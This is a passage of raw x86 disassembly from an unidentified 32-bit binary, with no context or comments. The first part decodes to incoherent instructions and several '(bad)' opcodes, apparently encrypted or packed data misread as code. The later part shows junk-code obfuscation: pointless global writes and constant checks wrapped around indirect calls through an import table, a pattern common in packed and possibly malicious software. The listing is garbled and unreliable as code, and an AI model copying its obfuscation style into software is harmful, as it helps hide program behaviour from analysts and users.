  41f07e:	sub    dl,BYTE PTR [esi]
  41f080:	and    al,0xd1
  41f082:	jle    0x41f0c5
  41f084:	jmp    0xb030:0xad1b58c6
  41f08b:	ret    
  41f08c:	mov    bl,0x65
  41f08e:	xchg   edi,eax
  41f08f:	jge    0x41f10b
  41f091:	int3   
  41f092:	fld    DWORD PTR [ebx]
  41f094:	test   al,0x22
  41f096:	test   edi,0x9c9576f7
  41f09c:	jne    0x41f10b
  41f09e:	inc    ebp
  41f09f:	(bad)
  41f0a3:	arpl   WORD PTR [ebp+edx*8-0x49],si
  41f0a7:	xor    eax,0xc8ca457c
  41f0ac:	cmp    dh,BYTE PTR [edi+ecx*8+0x5a]
  41f0b0:	push   ds
  41f0b1:	ds jnp 0x41f056
  41f0b4:	les    edi,FWORD PTR [ebx+esi*1-0x6b]
  41f0b8:	scas   al,BYTE PTR es:[edi]
  41f0b9:	sbb    eax,ecx
  41f0bb:	push   0xca69499c
  41f0c0:	fidiv  WORD PTR [ecx]
  41f0c2:	push   esp
  41f0c3:	mov    cl,0x52
  41f0c5:	xchg   edi,eax
  41f0c6:	and    ah,0xad
  41f0c9:	in     eax,0xf6
  41f0cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cc:	pop    esi
  41f0cd:	rcr    DWORD PTR [esi+0x49],0x60
  41f0d1:	(bad)  
  41f0d2:	mov    ah,0xfa
  41f0d4:	dec    edx
  41f0d5:	hlt    
  41f0d6:	mov    eax,ds:0xb4ca4132
  41f0db:	pushf  
  41f0dc:	pop    es
  41f0dd:	jnp    0x41f075
  41f0df:	mov    ebx,0x7bd85605
  41f0e4:	leave  
  41f0e5:	or     esp,DWORD PTR [edi+0x39f1a19b]
  41f0eb:	push   ss
  41f0ec:	enter  0x8972,0xaa
  41f0f0:	rol    ah,1
  41f0f2:	sbb    esi,ecx
  41f0f4:	mov    ds:0xa90dd25,eax
  41f0f9:	ds std 
  41f0fb:	adc    eax,DWORD PTR [edi+0x63]
  41f0fe:	jns    0x41f093
  41f100:	je     0x41f0a9
  41f102:	ins    BYTE PTR es:[edi],dx
  41f103:	add    al,0x92
  41f105:	sub    BYTE PTR [edx-0x79],dl
  41f108:	leave  
  41f109:	jge    0x41f138
  41f10b:	dec    esp
  41f10c:	adc    BYTE PTR [eax],bl
  41f10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f10f:	mov    DWORD PTR [eax+0x57],ebx
  41f112:	or     cl,BYTE PTR ds:0xe2a8f852
  41f118:	ja     0x41f162
  41f11a:	pusha  
  41f11b:	out    dx,eax
  41f11c:	into   
  41f11d:	mov    DWORD PTR [ebp+0x4527ddda],esi
  41f123:	jae    0x41f101
  41f125:	xchg   DWORD PTR [esi+0x2644976a],edi
  41f12b:	loope  0x41f161
  41f12d:	pop    es
  41f12e:	stos   BYTE PTR es:[edi],al
  41f12f:	add    DWORD PTR [ebx],0x15
  41f132:	ds pop ds
  41f134:	mov    edi,esi
  41f136:	cmp    eax,0x8cf8b395
  41f13b:	gs pushf 
  41f13d:	stc    
  41f13e:	out    dx,eax
  41f13f:	dec    esp
  41f140:	out    0x9f,al
  41f142:	mov    ebp,0x7f535ba3
  41f147:	push   edx
  41f148:	into   
  41f149:	adc    ecx,DWORD PTR [eax+0x3e]
  41f14c:	mov    ah,0xc9
  41f14e:	sbb    ebx,DWORD PTR [eax+0x26f334c8]
  41f154:	xor    cl,BYTE PTR [ebx+0xb4700cf]
  41f15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f15b:	cwde   
  41f15c:	sbb    DWORD PTR [ebx],edi
  41f15e:	pop    ebp
  41f15f:	add    dl,BYTE PTR [ecx]
  41f161:	jge    0x41f0f2
  41f163:	mov    ds:0xc914f8f8,al
  41f168:	arpl   WORD PTR [eax-0x3bb2bd27],bx
  41f16e:	clc    
  41f16f:	call   0xde9b:0x52e431d
  41f176:	ja     0x41f1cc
  41f178:	aas    
  41f179:	mov    ch,0xd2
  41f17b:	jbe    0x41f1b2
  41f17d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f17e:	leave  
  41f17f:	add    eax,0x35d59d66
  41f184:	push   ss
  41f185:	inc    ebx
  41f186:	mov    cl,0xd6
  41f188:	outs   dx,BYTE PTR ds:[esi]
  41f189:	mov    dl,0xdd
  41f18b:	inc    edi
  41f18c:	rcl    BYTE PTR [ecx-0x4b714690],cl
  41f192:	dec    eax
  41f193:	imul   ecx,DWORD PTR [edi+0x43],0x55
  41f197:	mul    esp
  41f199:	add    al,0x93
  41f19b:	jl     0x41f1ea
  41f19d:	cld    
  41f19e:	mov    ebp,0xcae25133
  41f1a3:	sbb    ebx,DWORD PTR [ecx+0x4e62ac17]
  41f1a9:	pop    ebp
  41f1aa:	adc    BYTE PTR [ebp-0x62],dl
  41f1ad:	mov    ds:0x3c88fed3,al
  41f1b2:	test   dl,cl
  41f1b4:	outs   dx,DWORD PTR ds:[esi]
  41f1b5:	sbb    DWORD PTR [ecx+0x54986541],edx
  41f1bb:	shl    edx,cl
  41f1bd:	aas    
  41f1be:	mov    esp,0xd97f49ff
  41f1c3:	xchg   esi,eax
  41f1c4:	iret   
  41f1c5:	loope  0x41f229
  41f1c7:	jge    0x41f1e2
  41f1c9:	imul   ecx,DWORD PTR [edx-0x42],0xd50ddedf
  41f1d0:	xchg   ecx,eax
  41f1d1:	je     0x41f186
  41f1d3:	and    BYTE PTR [eax+0x5f],ch
  41f1d6:	mov    DWORD PTR es:[edi+0x3630d1d6],ebx
  41f1dd:	(bad)  
  41f1de:	imul   edi,DWORD PTR [ebx+0x3a],0x19744a47
  41f1e5:	fadd   QWORD PTR [ecx+0x24b19d19]
  41f1eb:	add    DWORD PTR [edi+0x54d598a1],ecx
  41f1f1:	call   0x5be4:0xd4088e2f
  41f1f8:	inc    ebp
  41f1f9:	add    BYTE PTR [esi],0x5c
  41f1fc:	pop    es
  41f1fd:	(bad)  
  41f1fe:	ret    
  41f1ff:	loop   0x41f251
  41f201:	inc    ebx
  41f202:	ret    0xd5eb
  41f205:	rol    BYTE PTR [ecx+0x194b87d6],0x9b
  41f20c:	push   ebp
  41f20d:	rol    edx,1
  41f20f:	jbe    0x41f1ea
  41f211:	mov    esi,0xcf2215f5
  41f216:	push   0xee06c842
  41f21b:	lea    ebx,[ecx]
  41f21d:	jmp    0xc687ef65
  41f222:	sti    
  41f223:	inc    edx
  41f224:	or     eax,0x7fe01117
  41f229:	retf   
  41f22a:	sahf   
  41f22b:	in     eax,dx
  41f22c:	mov    bh,0x71
  41f22e:	out    0x94,eax
  41f230:	or     eax,0x7046af8c
  41f235:	mov    DWORD PTR [eax],ebx
  41f237:	and    DWORD PTR [edi],edx
  41f239:	sar    edi,1
  41f23b:	push   edi
  41f23c:	push   esp
  41f23d:	dec    edi
  41f23e:	xor    ecx,DWORD PTR [esi]
  41f240:	cmp    edi,DWORD PTR cs:[edi]
  41f243:	cld    
  41f244:	pop    ebp
  41f245:	push   cs
  41f246:	cwde   
  41f247:	xor    al,0xe7
  41f249:	xchg   ebp,eax
  41f24a:	jecxz  0x41f1e3
  41f24c:	mov    dh,0xa8
  41f24e:	adc    DWORD PTR [edx],eax
  41f250:	fisttp QWORD PTR [ecx+0x5e650c0a]
  41f256:	cmp    eax,0x9e768902
  41f25b:	popf   
  41f25c:	jmp    0xb1ef:0x86aa9dd
  41f263:	in     eax,0xad
  41f265:	fs jle 0x41f24b
  41f268:	add    ecx,edx
  41f26a:	cmp    al,0x4c
  41f26c:	mov    WORD PTR [ebp-0x59680934],es
  41f272:	cdq    
  41f273:	mov    DWORD PTR [eax+0x6902edb0],ecx
  41f279:	daa    
  41f27a:	pop    ds
  41f27b:	inc    ebx
  41f27c:	sti    
  41f27d:	push   eax
  41f27e:	xchg   edi,eax
  41f27f:	sub    al,dh
  41f281:	loopne 0x41f20c
  41f283:	or     al,0x49
  41f285:	stc    
  41f286:	inc    esp
  41f287:	test   BYTE PTR [edx-0xf],bh
  41f28a:	dec    ecx
  41f28b:	sbb    DWORD PTR [ebx+0x407baeca],ebx
  41f291:	or     ebp,esi
  41f293:	cwde   
  41f294:	mov    ch,0x4
  41f296:	pop    edx
  41f297:	sub    al,0x7a
  41f299:	mov    ebp,0x33ac25e3
  41f29e:	cmc    
  41f29f:	dec    esp
  41f2a0:	jmp    0x41f31e
  41f2a2:	jns    0x41f2f7
  41f2a4:	addr16 mov ebp,0xced171b4
  41f2aa:	popa   
  41f2ab:	into   
  41f2ac:	into   
  41f2ad:	pop    ecx
  41f2ae:	and    al,al
  41f2b0:	mov    bl,0x9c
  41f2b2:	shr    BYTE PTR [edx-0x3f],cl
  41f2b5:	stos   BYTE PTR es:[edi],al
  41f2b6:	fnstcw WORD PTR [esi]
  41f2b8:	sub    eax,DWORD PTR [esi-0x7ab50b68]
  41f2be:	add    ch,BYTE PTR [esi]
  41f2c0:	xchg   ecx,eax
  41f2c1:	inc    ebx
  41f2c2:	inc    edi
  41f2c3:	daa    
  41f2c4:	cmp    esi,eax
  41f2c6:	outs   dx,DWORD PTR ds:[esi]
  41f2c7:	push   ss
  41f2c8:	push   es
  41f2c9:	retf   
  41f2ca:	lock out 0xa0,eax
  41f2cd:	jge    0x41f2eb
  41f2cf:	aad    0x85
  41f2d1:	imul   ebx,esi,0xffffffbd
  41f2d4:	(bad)  
  41f2d5:	in     eax,dx
  41f2d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2d7:	fdivr  DWORD PTR [edi+0x7814c3f5]
  41f2dd:	jmp    0x41f2e6
  41f2df:	cmp    dl,BYTE PTR [esi-0x6bfdb055]
  41f2e5:	cmp    bh,al
  41f2e7:	push   ds
  41f2e8:	scas   al,BYTE PTR es:[edi]
  41f2e9:	cmp    ah,bl
  41f2eb:	jno    0x41f34f
  41f2ed:	jnp    0x41f2eb
  41f2ef:	ja     0x41f335
  41f2f1:	mov    ebp,0xa6772eb5
  41f2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f7:	jb     0x41f2f0
  41f2f9:	mov    eax,0xdbb66b62
  41f2fe:	retf   0xa081
  41f301:	aas    
  41f302:	xchg   esp,eax
  41f303:	fmul   st,st(3)
  41f305:	iret   
  41f306:	add    BYTE PTR [ebx+esi*1-0x37],bh
  41f30a:	and    BYTE PTR [edi+0x77],al
  41f30d:	lods   eax,DWORD PTR ds:[esi]
  41f30e:	and    al,0xab
  41f311:	pusha  
  41f312:	dec    edi
  41f313:	dec    ecx
  41f314:	(bad)  
  41f315:	xchg   ebx,eax
  41f316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f317:	das    
  41f318:	in     al,dx
  41f319:	sti    
  41f31a:	pop    ebp
  41f31b:	and    dh,BYTE PTR [eax+0x5cdbb87]
  41f321:	adc    esi,ecx
  41f323:	mov    cl,dl
  41f325:	xor    DWORD PTR [ecx],0xa7c529af
  41f32b:	imul   eax,DWORD PTR [eax+ebx*4],0xfffffff1
  41f32f:	or     sp,WORD PTR [edi]
  41f332:	or     esi,esp
  41f334:	cli    
  41f335:	mov    esp,0x84895094
  41f33a:	lock sub al,0x41
  41f33d:	or     BYTE PTR [edx],bh
  41f33f:	inc    eax
  41f340:	add    al,BYTE PTR [ecx]
  41f342:	pop    es
  41f343:	or     bh,BYTE PTR [ebp-0x5d]
  41f346:	mov    DWORD PTR [ebx-0x2c],ebp
  41f349:	adc    bl,BYTE PTR [edi+0x70]
  41f34c:	jbe    0x41f338
  41f34e:	test   esp,ebp
  41f350:	scas   al,BYTE PTR es:[edi]
  41f351:	push   edx
  41f352:	inc    esi
  41f353:	jl     0x41f2db
  41f355:	aas    
  41f356:	pop    ecx
  41f357:	scas   al,BYTE PTR es:[edi]
  41f358:	inc    ecx
  41f359:	scas   eax,DWORD PTR es:[edi]
  41f35a:	mov    dh,0x59
  41f35c:	(bad)
  41f35f:	mov    edx,DWORD PTR [ecx]
  41f361:	push   ebx
  41f362:	repz shl ecx,1
  41f365:	ret    0x4178
  41f368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f369:	mov    DWORD PTR [ebp-0x70],0x6f89
  41f370:	cmp    DWORD PTR ds:0x428323,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42823f
  41f37e:	mov    ecx,DWORD PTR ds:0x428287
  41f384:	mov    ecx,DWORD PTR ds:0x428273
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42825f,ebx
  41f397:	cmp    DWORD PTR ds:0x428323,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428133
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e30
  41f3c7:	sub    ecx,DWORD PTR ds:0x428257
  41f3cd:	mov    DWORD PTR ds:0x4281a7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428303,ebx
  41f3dd:	or     DWORD PTR ds:0x42831b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281af
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428337,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42818f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42839b,0x0
  41f428:	mov    DWORD PTR ds:0x42832f,0xae0
  41f432:	mov    DWORD PTR ds:0x42816b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42838b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428313,ebx
  41f449:	mov    DWORD PTR ds:0x42818f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42839b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f45
  41f468:	call   DWORD PTR ds:0x428eb4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283a7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281a7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282ff,0x6486
  41f49d:	mov    DWORD PTR ds:0x42826b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42829b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283a3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281a7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42800b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e34
  41f4d7:	neg    DWORD PTR ds:0x42819b
  41f4dd:	and    DWORD PTR ds:0x42827f,0x428303
  41f4e7:	and    DWORD PTR ds:0x42837f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428197
  41f4f4:	sbb    edx,DWORD PTR ds:0x42831f
  41f4fa:	mov    DWORD PTR ds:0x428197,edx
  41f500:	sub    DWORD PTR ds:0x428293,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42819f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283a3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428183,0x0
  41f53b:	mov    DWORD PTR ds:0x42839f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42825f,0x6044
  41f55b:	not    DWORD PTR ds:0x42826b
  41f561:	cmp    DWORD PTR ds:0x428183,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e38
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428163,edi
  41f5a3:	and    DWORD PTR ds:0x4282fb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428313
  41f5b0:	add    edx,DWORD PTR ds:0x42830b
  41f5b6:	mov    DWORD PTR ds:0x428313,edx
  41f5bc:	add    DWORD PTR ds:0x428307,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42826b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42839f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281ab,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42832f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42831f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283a3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428267,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42827b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428297,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428263
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282af,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42827b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e3c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42823b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428307
  41f67a:	add    DWORD PTR ds:0x42832b,ecx
  41f680:	sbb    DWORD PTR ds:0x42829f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428173
  41f68c:	adc    DWORD PTR ds:0x428167,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283cf
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42825f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428333,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428317,0x0
  41f6e5:	mov    DWORD PTR ds:0x42831f,0x6375
  41f6ef:	not    DWORD PTR ds:0x42817f
  41f6f5:	mov    DWORD PTR ds:0x42823b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42824b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42828f,ebx
  41f710:	cmp    DWORD PTR ds:0x428317,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42827b
  41f727:	call   DWORD PTR ds:0x428e40
  41f72d:	movzx  ecx,WORD PTR ds:0x42824b
  41f734:	xor    DWORD PTR ds:0x4283b7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42827b
  41f740:	add    ecx,DWORD PTR ds:0x428273
  41f746:	mov    DWORD PTR ds:0x42827b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42828b
  41f752:	adc    DWORD PTR ds:0x42839b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428337,ebx
  41f75f:	sub    DWORD PTR ds:0x428197,edx
  41f765:	and    DWORD PTR ds:0x428317,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42832b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428397,0x42830b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428247,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428257
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42824b,0x4281a7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428397,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428297
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283a3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428387
  41f7d9:	mov    DWORD PTR ds:0x42837b,ecx
  41f7df:	mov    DWORD PTR ds:0x42831f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42829f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428197,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283a3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f8a
  41f813:	push   0x427ef1
  41f818:	call   DWORD PTR ds:0x428eb8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283cb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428287,ecx
  41f830:	adc    DWORD PTR ds:0x42816f,edi
  41f836:	and    DWORD PTR ds:0x4283af,0x3101
  41f840:	mov    DWORD PTR ds:0x4283b7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42817f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42826f
  41f857:	mov    DWORD PTR ds:0x42825b,0x4504
  41f861:	mov    DWORD PTR ds:0x42838f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283b3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42831f,ebx
  41f87c:	cmp    DWORD PTR ds:0x42817f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fbc
  41f890:	push   0x427fc6
  41f895:	call   DWORD PTR ds:0x428ebc
  41f89b:	and    DWORD PTR ds:0x428197,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42831f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283b3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428187,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428277,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42838b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428173,0x4283af
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428287
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42823f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428303,0x0
  41f93e:	mov    DWORD PTR ds:0x428313,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281a3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282af
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428303,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428ec0
  41f979:	sbb    DWORD PTR ds:0x4283b3,0x209
  41f983:	xor    DWORD PTR ds:0x4283a3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42829f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281a3
  41f9bf:	or     DWORD PTR ds:0x42838f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428307,0x0
  41f9d1:	mov    DWORD PTR ds:0x42824b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428303,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42830b
  41f9f0:	cmp    DWORD PTR ds:0x428307,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e44
  41fa08:	adc    DWORD PTR ds:0x42839f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428323,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42837b
  41fa1b:	add    DWORD PTR ds:0x42838b,ecx
  41fa21:	add    DWORD PTR ds:0x428383,0x77eb
  41fa2b:	or     DWORD PTR ds:0x428303,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282af
  41fa3b:	and    DWORD PTR ds:0x42816f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42825b,0x42819b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282a3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428287,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428317,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281a7
  41fa8d:	mov    DWORD PTR ds:0x42819f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428287,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428093
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e48
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428163
  41fabc:	sbb    ecx,DWORD PTR ds:0x42825b
  41fac2:	mov    DWORD PTR ds:0x428163,ecx
  41fac8:	xor    DWORD PTR ds:0x4282ab,edx
  41face:	movzx  ecx,WORD PTR ds:0x428263
  41fad5:	or     DWORD PTR ds:0x4282fb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42838b
  41fae3:	add    DWORD PTR ds:0x42829f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42817b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281ab,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42830f
  41fb06:	mov    DWORD PTR ds:0x428393,edx
  41fb0c:	mov    DWORD PTR ds:0x42816f,ebx
  41fb12:	mov    DWORD PTR ds:0x428317,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281ab,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e4c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283b3
  41fb48:	or     ecx,DWORD PTR ds:0x428283
  41fb4e:	mov    DWORD PTR ds:0x4283b3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42817b
  41fb5a:	add    ecx,DWORD PTR ds:0x4283b3
  41fb60:	mov    DWORD PTR ds:0x42817b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42829b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282af
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42825f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428267,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42819f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
